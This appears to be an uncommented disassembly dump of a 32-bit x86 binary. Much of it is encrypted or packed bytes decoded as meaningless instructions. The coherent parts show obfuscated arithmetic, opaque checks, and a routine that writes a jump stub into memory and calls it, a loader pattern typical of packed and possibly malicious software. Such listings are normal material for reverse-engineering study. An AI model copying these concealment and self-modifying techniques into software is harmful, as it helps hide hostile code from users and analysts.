  40d52f:	adc    eax,0xd6aeed61
  40d534:	sub    eax,0xe715570f
  40d539:	jb     0x40d4f6
  40d53b:	xor    al,BYTE PTR [esi+0x2]
  40d53e:	in     eax,0x38
  40d540:	ficomp WORD PTR [edi-0xa]
  40d543:	les    eax,FWORD PTR ss:[ebp+0x60aca50a]
  40d54a:	cdq    
  40d54b:	inc    ebp
  40d54c:	xchg   ebp,eax
  40d54d:	shl    DWORD PTR [edi+0x78b5cb9d],1
  40d553:	lods   al,BYTE PTR ds:[esi]
  40d554:	and    al,0xe0
  40d556:	bound  edx,QWORD PTR [esi+edx*8-0x6e]
  40d55a:	les    eax,FWORD PTR [ecx]
  40d55c:	xlat   BYTE PTR ds:[ebx]
  40d55d:	retf   0x5194
  40d560:	cmp    BYTE PTR [eax+0x51],bl
  40d563:	and    al,0x5f
  40d565:	(bad)  
  40d566:	shl    DWORD PTR [edi+0x47732abb],cl
  40d56c:	adc    BYTE PTR [ebp-0xd7d332f],0x8a
  40d573:	mov    eax,esp
  40d575:	dec    ebx
  40d576:	fsubr  DWORD PTR [edi-0x2c]
  40d579:	aam    0xad
  40d57b:	xchg   edi,eax
  40d57c:	repnz cmp esp,DWORD PTR [ebp+ecx*8-0x21]
  40d581:	push   cs
  40d582:	and    al,0xd5
  40d584:	in     al,dx
  40d585:	lods   eax,DWORD PTR ds:[esi]
  40d586:	push   edi
  40d587:	mov    dh,0x93
  40d589:	and    edx,ebx
  40d58b:	nop
  40d58c:	(bad)  
  40d58d:	addr16 add eax,0x8e06f7e0
  40d593:	fcom   DWORD PTR [ebx+0x9]
  40d596:	pop    ss
  40d597:	bnd je 0x40d5a0
  40d59a:	mul    DWORD PTR [edx-0x58]
  40d59d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d59e:	lea    ebx,[esi]
  40d5a0:	jb     0x40d57e
  40d5a2:	pop    ss
  40d5a3:	mov    ebx,0x2bf4458b
  40d5a8:	enter  0xc969,0x80
  40d5ac:	je     0x40d5ae
  40d5ae:	add    BYTE PTR [ebx],al
  40d5b0:	dec    ebp
  40d5b1:	test   al,0x8b
  40d5b3:	inc    ebp
  40d5b4:	clc    
  40d5b5:	push   ecx
  40d5b6:	mov    ecx,DWORD PTR [ebp-0x4]
  40d5b9:	lea    eax,[ecx+eax*1-0x1e6d]
  40d5c0:	mov    ecx,DWORD PTR [ebp-0x64]
  40d5c3:	xor    edx,edx
  40d5c5:	div    ecx
  40d5c7:	mov    ecx,DWORD PTR [ebp-0x74]
  40d5ca:	lea    eax,[eax+ecx*1-0xa617]
  40d5d1:	push   eax
  40d5d2:	mov    eax,DWORD PTR [ebp-0x88]
  40d5d8:	mov    ecx,DWORD PTR [ebp-0x84]
  40d5de:	push   0x770a
  40d5e3:	push   0x2a0c
  40d5e8:	push   ecx
  40d5e9:	push   eax
  40d5ea:	call   0x41594e
  40d5ef:	mov    ecx,DWORD PTR [ebp-0x98]
  40d5f5:	mov    esi,DWORD PTR [ebp-0x94]
  40d5fb:	push   esi
  40d5fc:	push   ecx
  40d5fd:	or     edx,0x615d
  40d603:	or     eax,0x455c
  40d608:	push   edx
  40d609:	push   eax
  40d60a:	call   0x422239
  40d60f:	mov    ecx,DWORD PTR [ebp-0x70]
  40d612:	mov    edx,DWORD PTR [ebp-0x6c]
  40d615:	xor    eax,ecx
  40d617:	mov    ecx,DWORD PTR [ebp-0x20]
  40d61a:	mov    edx,DWORD PTR [ebp-0x1c]
  40d61d:	mov    esi,DWORD PTR [ebp-0x80]
  40d620:	and    eax,0xb49
  40d625:	add    esi,0x629b
  40d62b:	lea    eax,[eax+ecx*1-0xfd]
  40d632:	xor    esi,0x4994
  40d638:	push   eax
  40d639:	lea    esi,[ebp+esi*1-0x3c93]
  40d640:	call   0x40dbf7
  40d645:	mov    ecx,eax
  40d647:	mov    eax,DWORD PTR [ebp-0x50]
  40d64a:	mov    edx,DWORD PTR [ebp-0x7c]
  40d64d:	sub    eax,0x161
  40d652:	xor    eax,edx
  40d654:	imul   eax,eax,0x5151
  40d65a:	add    eax,0x3901
  40d65f:	xor    eax,0x40c2
  40d664:	xor    edx,edx
  40d666:	mov    esi,0x218f6c45
  40d66b:	div    esi
  40d66d:	cmp    ecx,eax
  40d66f:	jne    0x40d7dc
  40d675:	mov    ecx,DWORD PTR [ebp-0x78]
  40d678:	xor    edx,edx
  40d67a:	mov    eax,0x209c
  40d67f:	div    ecx
  40d681:	mov    ecx,DWORD PTR ds:0x4226b8
  40d687:	mov    ecx,DWORD PTR [ecx+0x1a8]
  40d68d:	xor    edx,edx
  40d68f:	sub    ecx,eax
  40d691:	mov    eax,DWORD PTR [ebp-0x4c]
  40d694:	xor    eax,0x3daa
  40d699:	sub    eax,0x3375
  40d69e:	or     eax,0x6931
  40d6a3:	lea    eax,[ebp+eax*1-0x6c25]
  40d6aa:	push   eax
  40d6ab:	mov    eax,DWORD PTR [ebp-0x8c]
  40d6b1:	push   0x18
  40d6b3:	pop    esi
  40d6b4:	div    esi
  40d6b6:	mov    esi,DWORD PTR [ebp-0x60]
  40d6b9:	xor    edx,edx
  40d6bb:	div    esi
  40d6bd:	mov    edx,DWORD PTR [ebp-0x44]
  40d6c0:	mov    esi,DWORD PTR [ebp-0x34]
  40d6c3:	xor    eax,edx
  40d6c5:	xor    edx,edx
  40d6c7:	div    esi
  40d6c9:	imul   eax,eax,0x7d2a
  40d6cf:	sub    eax,0x928ded7
  40d6d4:	push   eax
  40d6d5:	mov    eax,ds:0x4226b8
  40d6da:	add    eax,0xaa
  40d6df:	push   eax
  40d6e0:	mov    eax,DWORD PTR [ebp-0x3c]
  40d6e3:	sub    ecx,eax
  40d6e5:	mov    eax,DWORD PTR [ebp-0x24]
  40d6e8:	push   DWORD PTR [ecx+eax*1+0xbd4]
  40d6ef:	call   0x41b447
  40d6f4:	mov    DWORD PTR [ebp-0x4],eax
  40d6f7:	mov    ecx,DWORD PTR ds:0x4227c0
  40d6fd:	lea    eax,[ebp+0x4]
  40d700:	mov    DWORD PTR [ecx*4+0x4227b8],eax
  40d707:	inc    DWORD PTR ds:0x4227c0
  40d70d:	mov    eax,DWORD PTR [ebp-0x4]
  40d710:	mov    eax,DWORD PTR [ebp-0x4]
  40d713:	xor    edx,edx
  40d715:	shld   edx,eax,0x2
  40d719:	shl    eax,0x2
  40d71c:	mov    ecx,0xcb79b576
  40d721:	mov    esi,0x9c2b8ae8
  40d726:	xor    eax,ecx
  40d728:	xor    edx,esi
  40d72a:	cmp    eax,ecx
  40d72c:	jne    0x40d746
  40d732:	cmp    edx,esi
  40d734:	jne    0x40d746
  40d73a:	mov    eax,0xcb79b572
  40d73f:	mov    edx,esi
  40d741:	jmp    0x40dbf1
  40d746:	lea    eax,[ebp-0x10]
  40d749:	mov    DWORD PTR [ebp-0x9c],eax
  40d74f:	mov    eax,DWORD PTR [ebp-0x54]
  40d752:	mov    DWORD PTR [ebp-0x10],eax
  40d755:	mov    eax,DWORD PTR [ebp-0x10]
  40d758:	mov    ecx,DWORD PTR [ebp-0x4]
  40d75b:	sub    eax,ecx
  40d75d:	mov    DWORD PTR [ebp-0x10],eax
  40d760:	mov    eax,DWORD PTR [ebp-0x20]
  40d763:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d766:	sub    DWORD PTR [ebp-0x10],eax
  40d769:	mov    eax,DWORD PTR [ebp-0x4]
  40d76c:	mov    DWORD PTR [eax],0x658776e9
  40d772:	mov    DWORD PTR [eax+0x4],0xab756547
  40d779:	mov    eax,DWORD PTR [ebp-0x10]
  40d77c:	mov    ecx,DWORD PTR [ebp-0x4]
  40d77f:	mov    DWORD PTR [ecx+0x1],eax
  40d782:	mov    eax,ds:0x422534
  40d787:	push   DWORD PTR [eax]
  40d789:	push   DWORD PTR ds:0x4227a8
  40d78f:	push   DWORD PTR ds:0x42253c
  40d795:	push   DWORD PTR ds:0x422788
  40d79b:	push   DWORD PTR ds:0x4227fc
  40d7a1:	push   0xa5069baa
  40d7a6:	push   0xa5069bae
  40d7ab:	push   DWORD PTR [ebp-0x5c]
  40d7ae:	mov    eax,DWORD PTR [ebp-0x4]
  40d7b1:	call   eax
  40d7b3:	mov    eax,DWORD PTR [edi]
  40d7b5:	mov    eax,DWORD PTR [ebp+0x8]
  40d7b8:	push   DWORD PTR [eax]
  40d7ba:	call   0x40e823
  40d7bf:	mov    eax,ds:0x4226b8
  40d7c4:	push   0x4
  40d7c6:	add    eax,0x1dc
  40d7cb:	push   eax
  40d7cc:	push   edi
  40d7cd:	call   0x411c08
  40d7d2:	mov    eax,0xcb79b57e
  40d7d7:	jmp    0x40d73f
  40d7dc:	mov    eax,0xcb79b576
  40d7e1:	mov    edx,0x9c2b8ae8
  40d7e6:	jmp    0x40dbf1
  40d7eb:	hlt    
  40d7ec:	scas   eax,DWORD PTR es:[edi]
  40d7ed:	je     0x40d848
  40d7ef:	mov    ah,0x9a
  40d7f1:	cld    
  40d7f2:	mov    eax,0x90d1c6c0
  40d7f7:	clc    
  40d7f8:	iret   
  40d7f9:	mov    WORD PTR [ebp+eiz*2-0x6d414110],fs
  40d800:	les    edi,FWORD PTR [esi-0x11cf8f42]
  40d806:	xchg   ecx,eax
  40d807:	jmp    0x40d85f
  40d809:	enter  0xb77c,0x9c
  40d80d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d80e:	mov    ds:0x5184c9fe,eax
  40d813:	in     al,dx
  40d814:	sub    BYTE PTR [esi+0x5f0dcc82],cl
  40d81a:	and    BYTE PTR [eax+0x77119c7b],ch
  40d820:	repnz call 0x2469:0x806aa0d5
  40d828:	push   0x7f
  40d82a:	jnp    0x40d86c
  40d82c:	pop    ss
  40d82d:	pop    ss
  40d82e:	mov    ah,0x93
  40d830:	sub    dh,al
  40d832:	mov    dl,0xcd
  40d834:	push   ecx
  40d835:	int    0x74
  40d837:	sub    esp,esi
  40d839:	mov    ebp,0xc7343085
  40d83e:	repnz inc esp
  40d840:	in     eax,0xbe
  40d842:	pop    esp
  40d843:	test   DWORD PTR [esi+0x6dd4c337],edi
  40d849:	lods   al,BYTE PTR ds:[esi]
  40d84a:	pop    edi
  40d84b:	and    ah,bl
  40d84d:	dec    esp
  40d84e:	shl    eax,1
  40d850:	mov    BYTE PTR [ecx],dl
  40d852:	xchg   ebp,eax
  40d853:	out    0xcb,al
  40d855:	daa    
  40d856:	loop   0x40d88c
  40d858:	fcomp  QWORD PTR [edi]
  40d85a:	pop    esp
  40d85b:	(bad)  
  40d85c:	xchg   esp,eax
  40d85d:	ds test eax,0xef4ee31c
  40d863:	ja     0x40d896
  40d865:	push   esp
  40d866:	sub    eax,0x7f7aee42
  40d86b:	gs add eax,0xcd94c418
  40d871:	push   esp
  40d872:	dec    ebx
  40d873:	lock js 0x40d8d2
  40d876:	xchg   edi,eax
  40d877:	mov    esp,0x30f0c3c3
  40d87c:	dec    eax
  40d87d:	push   eax
  40d87e:	mov    BYTE PTR [eax],bl
  40d880:	in     al,0xf0
  40d882:	mov    cl,0xbc
  40d884:	out    dx,eax
  40d885:	push   edi
  40d886:	sub    DWORD PTR [esi-0x51],ebx
  40d889:	call   0x31fdf6c4
  40d88e:	sbb    bh,BYTE PTR [edx-0x43]
  40d891:	test   ebx,0x33842482
  40d897:	push   cs
  40d898:	fisttp DWORD PTR [ebx+0x259d3c7b]
  40d89e:	pop    edi
  40d89f:	dec    ebp
  40d8a0:	sub    BYTE PTR [edx],dh
  40d8a2:	or     edx,DWORD PTR ds:0xc6a44539
  40d8a8:	inc    edi
  40d8a9:	rcl    DWORD PTR [edi],cl
  40d8ab:	call   0x3b54:0x55688971
  40d8b2:	shr    BYTE PTR [edx+0x28396cbe],0xf8
  40d8b9:	sbb    ah,al
  40d8bb:	cmp    ch,BYTE PTR ds:0xfae36f85
  40d8c1:	adc    eax,edi
  40d8c3:	daa    
  40d8c4:	xchg   ebp,eax
  40d8c5:	pop    esi
  40d8c6:	inc    eax
  40d8c7:	add    ah,BYTE PTR [esi+0x552f36c8]
  40d8cd:	dec    ebx
  40d8ce:	(bad)  
  40d8cf:	ds repz or al,0xba
  40d8d3:	xor    DWORD PTR [ecx-0x5ce7a297],esi
  40d8d9:	push   ds
  40d8da:	mov    ds:0x895f6d24,eax
  40d8df:	adc    cl,ah
  40d8e1:	nop
  40d8e2:	pop    ecx
  40d8e3:	rcl    BYTE PTR [eax+0x74],0xb7
  40d8e7:	xchg   esi,eax
  40d8e8:	add    BYTE PTR [ecx-0x79e4c21f],cl
  40d8ee:	dec    ebx
  40d8ef:	mov    ecx,0x77958992
  40d8f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8f5:	dec    edx
  40d8f6:	xor    al,0xf0
  40d8f8:	outs   dx,BYTE PTR ds:[esi]
  40d8f9:	sub    al,0x67
  40d8fb:	fwait
  40d8fc:	outs   dx,DWORD PTR ds:[esi]
  40d8fd:	and    DWORD PTR [eax-0x67318a4f],0xbd3e1ce3
  40d907:	adc    eax,0xad70fcb3
  40d90c:	sub    ebx,esp
  40d90e:	cmp    DWORD PTR [ebx+0x4f],esp
  40d911:	and    BYTE PTR [ecx-0x2c],ah
  40d914:	cmp    DWORD PTR [edi-0x59aa9b38],edx
  40d91a:	mov    ebp,0xe8c4018f
  40d91f:	sar    edi,0x6c
  40d922:	call   0xbd29:0x11fcab83
  40d929:	arpl   WORD PTR [ecx],dx
  40d92b:	add    bh,BYTE PTR [edx+eax*1-0x6310e69e]
  40d932:	dec    esp
  40d933:	repnz cmp dl,0x82
  40d937:	adc    eax,0x4c424356
  40d93c:	mov    WORD PTR [edi+ebp*4-0x1fe64f8c],di
  40d944:	cwde   
  40d945:	sbb    al,0x54
  40d947:	mov    ch,0xd6
  40d949:	pop    eax
  40d94a:	je     0x40d930
  40d94c:	cld    
  40d94d:	sahf   
  40d94e:	push   esi
  40d94f:	adc    eax,0x889937fc
  40d954:	fisub  WORD PTR [edi+0x42]
  40d957:	pop    edx
  40d958:	in     eax,0x76
  40d95a:	test   eax,0x676e2b0d
  40d95f:	dec    ecx
  40d960:	mov    eax,0x44c642b7
  40d965:	push   eax
  40d966:	push   esp
  40d967:	and    eax,0x15051461
  40d96c:	jmp    0xfbd9:0xa4d45c08
  40d973:	call   0xf9b4:0x8682e6eb
  40d97a:	jg     0x40d8ff
  40d97c:	(bad)  
  40d97e:	(bad)  
  40d980:	fstp   QWORD PTR [ebx+0x4b]
  40d983:	adc    edi,DWORD PTR ds:0x4d299460
  40d989:	leave  
  40d98a:	push   0xfffffff0
  40d98c:	retf   0x7ac3
  40d98f:	lods   eax,DWORD PTR ds:[esi]
  40d990:	inc    eax
  40d991:	sub    BYTE PTR [ebx+ebx*4+0xef55cf4],0x55
  40d999:	imul   edi,DWORD PTR [edx+0x4bae6581],0x7e1c01f4
  40d9a3:	aad    0x21
  40d9a5:	mov    WORD PTR [ebp+0x41],ss
  40d9a8:	mov    dh,BYTE PTR ds:0x1fbabfc8
  40d9ae:	mov    bl,0xf3
  40d9b0:	pop    ebx
  40d9b1:	mov    esp,0x981341e5
  40d9b6:	daa    
  40d9b7:	dec    esi
  40d9b8:	adc    eax,0x41c269b1
  40d9bd:	push   ss
  40d9be:	imul   ebp,DWORD PTR ds:0xce7f9e7a,0x712161f3
  40d9c8:	les    ecx,FWORD PTR [edx-0x47]
  40d9cb:	mov    ch,0xe0
  40d9cd:	dec    esp
  40d9ce:	jge    0x40d992
  40d9d0:	mov    eax,ds:0x98fbd7f0
  40d9d5:	stos   BYTE PTR es:[edi],al
  40d9d6:	dec    esp
  40d9d7:	mov    cl,0xc8
  40d9d9:	aas    
  40d9da:	dec    edx
  40d9db:	mov    ch,0xc2
  40d9dd:	idiv   DWORD PTR [esi]
  40d9df:	daa    
  40d9e0:	push   edi
  40d9e1:	mov    esp,0x1f8e54eb
  40d9e6:	aas    
  40d9e7:	mov    esp,DWORD PTR [eax+0x2d]
  40d9ea:	das    
  40d9eb:	out    dx,eax
  40d9ec:	jae    0x40d9fa
  40d9ee:	in     eax,0x96
  40d9f0:	sbb    DWORD PTR [ebp+0x4fcc4d3f],ebx
  40d9f6:	repz pusha 
  40d9f8:	mul    DWORD PTR [edi-0x5b]
  40d9fb:	sbb    BYTE PTR [eax+0x1d7bd3c2],dh
  40da01:	jns    0x40d9d9
  40da03:	adc    DWORD PTR [edx-0x1a779a16],ebp
  40da09:	sub    dl,ch
  40da0b:	jmp    0x40d99c
  40da0d:	sbb    ch,BYTE PTR [ebp+esi*2+0xa]
  40da11:	mov    bl,0x26
  40da13:	out    0x65,eax
  40da15:	in     al,0x90
  40da17:	push   ecx
  40da18:	jle    0x40d9ec
  40da1a:	add    edx,DWORD PTR [ecx+0x1e0cce72]
  40da20:	jno    0x40d9a7
  40da22:	xchg   edi,eax
  40da23:	int3   
  40da24:	rol    BYTE PTR [ebp+0x49],1
  40da27:	sbb    BYTE PTR [eax+0x31],0x79
  40da2b:	mov    esi,0xc42a109a
  40da30:	(bad)  
  40da31:	jbe    0x40daae
  40da33:	adc    edx,DWORD PTR [ebx]
  40da35:	neg    DWORD PTR [edx+ecx*2]
  40da38:	cs or  ecx,ebp
  40da3b:	push   eax
  40da3c:	push   ebx
  40da3d:	repz add DWORD PTR [esp+esi*2],0xfa0f1f93
  40da45:	and    eax,0x1e62a9a4
  40da4a:	js     0x40daa4
  40da4c:	sub    eax,eax
  40da4e:	sub    DWORD PTR ds:0xd10e8be3,edx
  40da54:	and    edi,edx
  40da56:	out    0x53,al
  40da58:	sub    dh,BYTE PTR [eax+0x59]
  40da5b:	jbe    0x40da38
  40da5d:	xor    ecx,edi
  40da5f:	mov    ds:0xb765ebe0,al
  40da64:	mov    edx,0xd763734e
  40da69:	sbb    DWORD PTR [ebx-0x471bec0c],ecx
  40da6f:	loop   0x40da0a
  40da71:	lds    ecx,FWORD PTR ds:0xfc6a71e8
  40da77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da78:	(bad)  [edi]
  40da7a:	loop   0x40da38
  40da7c:	jmp    0xf87cd476
  40da81:	pop    esp
  40da82:	add    bh,BYTE PTR [ecx-0x53]
  40da85:	dec    BYTE PTR [ebx]
  40da87:	and    WORD PTR [esi-0x5],bx
  40da8b:	les    edi,FWORD PTR [ecx-0x90a090d]
  40da91:	pop    es
  40da92:	pop    ecx
  40da93:	shl    BYTE PTR [edi-0x52],0xce
  40da97:	(bad)  
  40da98:	lock mov edi,0x158bfe37
  40da9e:	jl     0x40da7c
  40daa0:	xchg   esp,eax
  40daa1:	rol    BYTE PTR [ebx+0x683f8de6],0x85
  40daa8:	pop    esi
  40daa9:	loopne 0x40da95
  40daab:	clc    
  40daac:	call   0x207c:0xe644599a
  40dab3:	addr16 mov ?,eax
  40dab6:	xor    eax,0xef26e65e
  40dabb:	inc    esi
  40dabc:	adc    DWORD PTR [ecx],ecx
  40dabe:	repz push 0x82041a49
  40dac4:	pop    eax
  40dac5:	cmc    
  40dac6:	add    ebp,ecx
  40dac8:	aaa    
  40dac9:	sub    ecx,0xffffffd6
  40dacc:	sub    dh,BYTE PTR [edx+0x3d]
  40dacf:	lods   al,BYTE PTR ds:[esi]
  40dad0:	adc    eax,0x7a40d453
  40dad5:	ror    BYTE PTR [eax*2-0x52beab43],0xdc
  40dadd:	cmp    eax,0x36e914ed
  40dae2:	rol    BYTE PTR [edx],cl
  40dae4:	int3   
  40dae5:	mov    ecx,DWORD PTR [eax]
  40dae7:	(bad)  
  40dae8:	lea    ebp,[ecx-0x21]
  40daeb:	int    0x54
  40daed:	jecxz  0x40da97
  40daef:	jne    0x40db15
  40daf1:	(bad)  
  40daf2:	ins    BYTE PTR es:[edi],dx
  40daf3:	idiv   ebp
  40daf5:	iret   
  40daf6:	call   0xf65c:0x95c2ef3c
  40dafd:	call   0x1109946f
  40db02:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db04:	xchg   ebx,eax
  40db05:	push   0xffffffe4
  40db07:	mov    dl,0x19
  40db09:	inc    esi
  40db0a:	test   al,0x4a
  40db0c:	(bad)  
  40db0d:	retf   
  40db0e:	sub    bl,BYTE PTR [edi-0x3ba600ea]
  40db14:	inc    esi
  40db15:	or     eax,DWORD PTR [edi+0x7c]
  40db18:	in     eax,0x20
  40db1a:	arpl   WORD PTR [esi+0x72],si
  40db1d:	popf   
  40db1e:	test   eax,0x6419f46e
  40db23:	stos   BYTE PTR es:[edi],al
  40db24:	imul   esi,DWORD PTR [eax-0x7dea640e],0xffffffcc
  40db2b:	or     WORD PTR [edi],di
  40db2e:	pop    esp
  40db2f:	add    DWORD PTR ds:0xc8d2e4c,ecx
  40db35:	div    DWORD PTR [edx-0x923f038]
  40db3b:	mov    eax,ds:0x128018a5
  40db40:	hlt    
  40db41:	mov    edx,cs
  40db43:	xchg   ebp,edx
  40db45:	fadd   QWORD PTR [edi]
  40db47:	add    al,0x68
  40db49:	int    0x3a
  40db4b:	xchg   DWORD PTR [esi],esp
  40db4d:	xchg   esp,eax
  40db4e:	sbb    al,0x77
  40db50:	or     BYTE PTR [eax],ch
  40db52:	add    bh,BYTE PTR [ebx-0x64f40f81]
  40db58:	inc    ecx
  40db59:	jno    0x40dae4
  40db5b:	dec    ebx
  40db5c:	cmp    al,0x79
  40db5e:	(bad)  
  40db5f:	imul   DWORD PTR ds:0x7176c3c
  40db65:	add    ebp,esi
  40db67:	aad    0xa4
  40db69:	mov    esi,0xad2a5ec
  40db6e:	imul   BYTE PTR [ebx-0x38e02e11]
  40db74:	sub    ecx,DWORD PTR [edi-0x5d]
  40db77:	add    al,0x63
  40db79:	inc    esp
  40db7a:	call   0x50b57339
  40db7f:	or     esp,DWORD PTR [esi+eax*1+0x7f]
  40db83:	in     eax,dx
  40db84:	mov    ah,0xd6
  40db86:	cmp    DWORD PTR [esi+0x37],ebx
  40db89:	into   
  40db8a:	fistp  QWORD PTR [ebp+0x3ab1030a]
  40db90:	and    al,0x96
  40db92:	fst    st(2)
  40db94:	lahf   
  40db95:	or     al,0x44
  40db97:	addr16 cs inc esi
  40db9a:	retf   0x9fe2
  40db9d:	std    
  40db9e:	fcomi  st,st(7)
  40dba0:	lds    edx,FWORD PTR [ecx-0xa]
  40dba3:	or     BYTE PTR [edi-0x18],bl
  40dba6:	out    dx,al
  40dba7:	int    0xb9
  40dba9:	aam    0xca
  40dbab:	sbb    ecx,DWORD PTR [ebx+0x33]
  40dbae:	icebp  
  40dbaf:	(bad)  [eax+0x24]
  40dbb2:	jne    0x40db8b
  40dbb4:	stos   BYTE PTR es:[edi],al
  40dbb5:	and    BYTE PTR [edx+0x661ef97f],dl
  40dbbb:	in     eax,0xba
  40dbbd:	cdq    
  40dbbe:	mov    WORD PTR [eax-0x463c3a8b],cs
  40dbc4:	xor    al,BYTE PTR [ebx-0x5e9b2074]
  40dbca:	(bad)  
  40dbcb:	lods   eax,DWORD PTR ds:[esi]
  40dbcc:	call   0xe321bbfd
  40dbd1:	pusha  
  40dbd2:	sub    ebp,edi
  40dbd4:	leave  
  40dbd5:	sub    al,0x13
  40dbd7:	inc    ecx
  40dbd8:	shr    BYTE PTR [edx],1
  40dbda:	repnz sahf 
  40dbdc:	xor    al,0xe1
  40dbde:	retf   
  40dbdf:	xchg   ebp,eax
  40dbe0:	xor    al,dl
  40dbe2:	sbb    eax,eax
  40dbe4:	int3   
  40dbe5:	sbb    al,0x86
  40dbe7:	or     bh,BYTE PTR [ebp+ebx*4-0x51]
  40dbeb:	xchg   esi,eax
  40dbec:	rcl    DWORD PTR [esi],cl
  40dbee:	jns    0x40dc53
  40dbf0:	lock pop esi
  40dbf2:	pop    ebx
  40dbf3:	leave  
  40dbf4:	ret    0x4
  40dbf7:	push   ebp
  40dbf8:	mov    ebp,esp
  40dbfa:	sub    esp,0x20
  40dbfd:	push   ebx
  40dbfe:	push   edi
  40dbff:	mov    DWORD PTR [ebp-0x8],0x522e
  40dc06:	mov    DWORD PTR [ebp-0x4],0x3dbd
  40dc0d:	mov    DWORD PTR [ebp-0x10],0x53f1
  40dc14:	mov    DWORD PTR [ebp-0xc],0x631b
  40dc1b:	jmp    0x40deaa
  40dc20:	dec    ebx
  40dc21:	pop    esi
  40dc22:	xchg   ebp,eax
  40dc23:	idiv   DWORD PTR [eax+edi*1-0x2a408d55]
  40dc2a:	push   ss
  40dc2b:	rol    DWORD PTR [esi-0x2f],1
  40dc2e:	cmp    al,0x92
  40dc30:	cmp    eax,edi
  40dc32:	mov    esi,0xbec299be
  40dc37:	mov    esi,0xdcae2638
  40dc3c:	add    BYTE PTR [eax],dh
  40dc3e:	leave  
  40dc3f:	xor    DWORD PTR [edx+edi*1-0x32],ecx
  40dc43:	push   ebx
  40dc44:	out    0xe3,eax
  40dc46:	add    al,0xcc
  40dc48:	hlt    
  40dc49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc4a:	test   esi,ebp
  40dc4c:	rcl    BYTE PTR [ebx],0x18
  40dc4f:	retf   
  40dc50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc51:	mov    edi,DWORD PTR fs:[edx]
  40dc54:	sahf   
  40dc55:	xchg   edi,ecx
  40dc57:	sbb    eax,0x190da4fe
  40dc5c:	cwde   
  40dc5d:	jecxz  0x40dcb4
  40dc5f:	mov    esi,0xc4ef0467
  40dc64:	sbb    DWORD PTR [esi+edx*8-0x2129db87],esi
  40dc6b:	xchg   ebx,eax
  40dc6c:	stos   BYTE PTR es:[edi],al
  40dc6d:	ja     0x40dcd1
  40dc6f:	xlat   BYTE PTR ds:[ebx]
  40dc70:	sahf   
  40dc71:	mov    BYTE PTR [edi+eiz*8-0x6d],ch
  40dc75:	sbb    eax,0xfa81e546
  40dc7a:	lock inc ecx
  40dc7c:	gs into 
  40dc7e:	je     0x40dce2
  40dc80:	xchg   BYTE PTR [eax+ebx*2+0x47],dh
  40dc84:	(bad)  
  40dc85:	cmp    al,0xbf
  40dc87:	daa    
  40dc88:	xchg   bh,cl
  40dc8a:	pushf  
  40dc8b:	pop    edx
  40dc8c:	push   cs
  40dc8d:	inc    ebp
  40dc8e:	pop    ds
  40dc8f:	ins    BYTE PTR es:[edi],dx
  40dc90:	push   esp
  40dc91:	retf   
  40dc92:	mov    ds:0x22d8f820,eax
  40dc97:	mov    edx,0x4891c567
  40dc9c:	add    ah,ah
  40dc9e:	sub    ecx,DWORD PTR [edi+0x61]
  40dca1:	inc    ebp
  40dca2:	jle    0x40dc6c
  40dca4:	pop    DWORD PTR [edx]
  40dca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dca7:	push   edx
  40dca8:	sahf   
  40dca9:	sub    al,0xa
  40dcab:	sub    dh,dh
  40dcad:	into   
  40dcae:	dec    ebx
  40dcaf:	or     cl,bh
  40dcb1:	outs   dx,DWORD PTR ds:[esi]
  40dcb2:	mov    esi,0x9908a88e
  40dcb7:	sub    BYTE PTR [ebx+0x6a26c2af],dl
  40dcbd:	push   es
  40dcbe:	inc    ebx
  40dcbf:	neg    DWORD PTR [edx+ecx*8]
  40dcc2:	adc    DWORD PTR [edi],esi
  40dcc4:	mov    ecx,0x8c48815c
  40dcc9:	(bad)  
  40dcca:	aas    
  40dccb:	aaa    
  40dccc:	rol    cl,1
  40dcce:	jl     0x40dc71
  40dcd0:	fldcw  WORD PTR ds:0x27085649
  40dcd6:	and    bh,bh
  40dcd8:	mov    WORD PTR ds:[ecx+ebp*4],ss
  40dcdc:	push   ebp
  40dcdd:	push   cs
  40dcde:	mov    WORD PTR [ebx-0x36db8cfb],gs
  40dce4:	add    al,0x84
  40dce6:	dec    edi
  40dce7:	dec    ebx
  40dce8:	aas    
  40dce9:	add    ebx,DWORD PTR ds:0xf55b47bd
  40dcef:	sbb    ah,cl
  40dcf1:	push   ds
  40dcf2:	cli    
  40dcf3:	mov    ch,0xf6
  40dcf5:	lods   al,BYTE PTR ds:[esi]
  40dcf6:	(bad)  
  40dcf7:	std    
  40dcf8:	pop    esi
  40dcf9:	push   ss
  40dcfa:	push   edi
  40dcfb:	dec    esi
  40dcfc:	lods   eax,DWORD PTR ds:[esi]
  40dcfd:	stos   BYTE PTR es:[edi],al
  40dcfe:	leave  
  40dcff:	ss pop ds
  40dd01:	out    0x24,al
  40dd03:	sbb    al,0xb4
  40dd05:	and    DWORD PTR [edx+0x56],edx
  40dd08:	mov    al,ds:0x621c5ce3
  40dd0d:	out    0x5d,al
  40dd0f:	scas   eax,DWORD PTR es:[edi]
  40dd10:	fimul  DWORD PTR [esi+eiz*4-0x292076fc]
  40dd17:	mov    ds:0xe145b1b1,al
  40dd1c:	sbb    cl,BYTE PTR [edx+ebp*2+0xe973b50]
  40dd23:	fcmovnbe st,st(0)
  40dd25:	xchg   DWORD PTR [ebx],ebp
  40dd27:	and    al,0xf0
  40dd29:	pop    es
  40dd2a:	das    
  40dd2b:	xor    BYTE PTR ds:0x5e2f88a2,dl
  40dd31:	push   ebx
  40dd32:	pop    ds
  40dd33:	ja     0x40dd6b
  40dd35:	dec    ecx
  40dd36:	cmp    dh,dl
  40dd38:	dec    edx
  40dd39:	add    DWORD PTR [edx],eax
  40dd3b:	sub    DWORD PTR [esi+0x54fef3ad],ebx
  40dd41:	jns    0x40dd7c
  40dd43:	mov    dh,0xfe
  40dd45:	mov    al,0xdf
  40dd47:	(bad)  
  40dd48:	aaa    
  40dd49:	push   esi
  40dd4a:	inc    esp
  40dd4b:	inc    esp
  40dd4c:	lock mov ebp,0x65de5f72
  40dd52:	sbb    DWORD PTR [eiz*8-0x70776980],eax
  40dd59:	pop    es
  40dd5a:	in     al,0x8f
  40dd5c:	outs   dx,DWORD PTR ds:[esi]
  40dd5d:	jnp    0x40ddcc
